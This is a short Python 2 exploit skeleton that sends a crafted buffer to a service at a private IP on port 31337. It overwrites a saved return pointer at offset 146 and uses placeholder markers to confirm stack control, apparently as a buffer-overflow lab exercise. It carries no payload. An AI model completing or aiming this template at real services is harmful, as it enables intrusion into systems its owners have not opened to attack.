#!/usr/bin/env python2
import socket

RHOST = "172.16.1.54"
RPORT = 31337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

buf_totlen = 1024
offset_srp = 146

buf = ""
buf += "A"*(offset_srp - len(buf)) # padding
buf += "BBBB" # SRP overwrite
buf += "CCCC" # ESP should end up pointing here
buf += "D"*(buf_totlen - len(buf)) # trailing padding
buf += "\n"
s.send(buf)
